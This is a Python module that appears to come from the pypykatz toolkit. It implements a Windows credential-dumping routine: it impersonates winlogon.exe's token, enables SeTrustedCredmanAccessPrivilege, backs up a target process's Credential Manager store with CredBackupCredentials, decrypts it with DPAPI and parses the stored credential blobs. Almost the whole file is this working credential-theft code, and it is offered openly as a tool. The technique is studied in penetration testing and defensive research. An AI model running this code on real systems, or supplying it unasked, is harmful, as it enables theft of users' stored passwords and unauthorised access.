# Thank you!
# https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html

import tempfile
import os

from pypykatz import logger
from pypykatz.commons.winapi.local.function_defs.advapi32 import CredBackupCredentials
from pypykatz.commons.readers.local.process import Process, PROCESS_QUERY_LIMITED_INFORMATION
from pypykatz.commons.readers.local.common.privileges import enable_debug_privilege, RtlAdjustPrivilege
from pypykatz.commons.winapi.local.function_defs.advapi32 import SetThreadToken
from pypykatz.dpapi.functiondefs.dpapi import CryptUnprotectData
from pypykatz.dpapi.structures.credentialfile import CREDENTIAL_BLOB, CredentialFile


def dpapi_trustedcredman(target_pid, special_process = 'winlogon.exe', temp_file_path = None):
    dec_data = None
    try:
        if temp_file_path is None:
            tf = tempfile.NamedTemporaryFile(delete=False)
            temp_file_path = tf.name 
            logger.debug('Temp file path: %s' % temp_file_path)
            tf.close()

        enable_debug_privilege()

        ### opening winlogon and duplicating token, impersonating it, enabling SeTrustedCredmanAccessPrivilege
        pwinlogon = Process(name = special_process, access = PROCESS_QUERY_LIMITED_INFORMATION, open = True)
        winlogon_token = pwinlogon.duplicate_token()
        SetThreadToken(winlogon_token)
        RtlAdjustPrivilege(31, thread_or_process=True) #SeTrustedCredmanAccessPrivilege = 31
        
        
        ### opening target process, getting handle on its token
        puserprocess = Process(pid=target_pid, access = PROCESS_QUERY_LIMITED_INFORMATION, open = True)
        puserprocess_token = puserprocess.get_process_token()

        ### magic happens here
        CredBackupCredentials(puserprocess_token, temp_file_path)

        ### opening encrypted cerentials file and decrypting it
        with open(temp_file_path, 'rb') as f:
            dec_data = CryptUnprotectData(f.read())


        ### parsing decrypted credfile
        results = []
        xf = CredentialFile.from_bytes(dec_data)
        blobsdata = xf.data
        if xf.unk == 2:
            res = CREDENTIAL_BLOB.from_bytes(blobsdata)
            results.append(res)
            blobsdata = blobsdata[res.size:]
            while len(blobsdata) > 0:
                res = CREDENTIAL_BLOB.from_bytes(blobsdata)
                results.append(res)
                blobsdata = blobsdata[res.size:]

        return dec_data, results, None
    except Exception as e:        
        logger.debug('dpapi_trustedcredman err! %s' % e)
        return dec_data, None, e
    finally:
        try:
            os.unlink(temp_file_path)
            logger.debug('Temp file removed')
        except Exception as e:
            logger.debug('Failed to remove temp file! %s' % str(e))
            pass